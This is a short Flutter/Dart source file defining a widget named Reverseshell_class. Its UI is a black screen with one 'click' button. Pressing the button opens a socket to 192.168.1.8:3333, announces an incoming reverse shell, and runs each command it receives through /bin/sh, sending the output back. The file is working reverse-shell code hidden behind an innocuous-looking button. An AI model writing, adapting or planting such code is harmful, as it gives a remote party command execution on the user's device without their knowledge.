import 'package:flutter/material.dart';
import 'dart:io';
import 'dart:convert';

 class Reverseshell_class extends StatelessWidget {

Future dta()async
{
  print("hello world");
  Socket.connect("192.168.1.8", 3333).then((socket) {
    print("we are in ..............");
    socket.write('[*] Incoming reverseshell...\n');
    socket.listen((data) {
     Process.start("/bin/sh",['']).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());

        process.stdout
            .transform(utf8.decoder)
            .listen((output) { socket.write(output); socket.flush(); });
      });
    },
        onDone: () {
          socket.destroy();
        });
  }).catchError((err){print(err);});
}

  @override
  Widget build(BuildContext context) {
    return MaterialApp(home: Scaffold( backgroundColor: Colors.black,appBar: AppBar(),body: Column(
      children: [
        ElevatedButton(onPressed: (){dta();},child: Text("click"),),
      ],
    ),));
  }
}
